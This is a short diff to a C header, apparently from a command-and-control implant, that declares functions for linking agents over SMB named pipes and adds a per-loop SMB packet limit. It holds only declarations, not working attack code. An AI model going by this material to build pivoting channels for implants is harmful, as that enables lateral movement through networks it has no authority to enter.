@@ -7,11 +7,15 @@
 #include "Config.h"
 
 #ifdef INCLUDE_CMD_LINK
+
+#define MAX_SMB_PACKETS_PER_LOOP 30
+
 VOID Link( PCHAR taskUuid, PPARSER arguments );
 BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen );
-// BOOL LinkForward( PPARSER delegates );
 BOOL LinkForward( PVOID Msg, SIZE_T Length );
 UINT32 PivotParseLinkId( PVOID buffer, SIZE_T size );
+
+VOID LinkPush();
 #endif
 
 #ifdef INCLUDE_CMD_UNLINK
